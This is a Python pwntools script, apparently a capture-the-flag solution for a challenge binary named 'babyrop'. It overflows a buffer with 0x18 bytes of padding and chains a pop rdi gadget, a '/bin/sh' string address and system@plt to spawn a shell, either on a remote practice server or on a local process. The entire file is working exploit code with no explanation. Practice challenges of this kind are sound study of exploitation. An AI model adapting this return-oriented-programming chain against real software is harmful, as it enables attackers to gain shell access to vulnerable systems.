from pwn import  *
from sys import argv

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(arch='amd64', os='linux', log_level = 'DEBUG')
binary = './babyrop'
elf = ELF(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('node3.buuoj.cn',28423) if argv[1]=='r' else process(binary)

# start
binsh = 0x601048
pop_rdi = 0x400683

payload = flat('a'*0x18,pop_rdi,binsh,elf.plt['system'])
sl(payload)
# end

itr()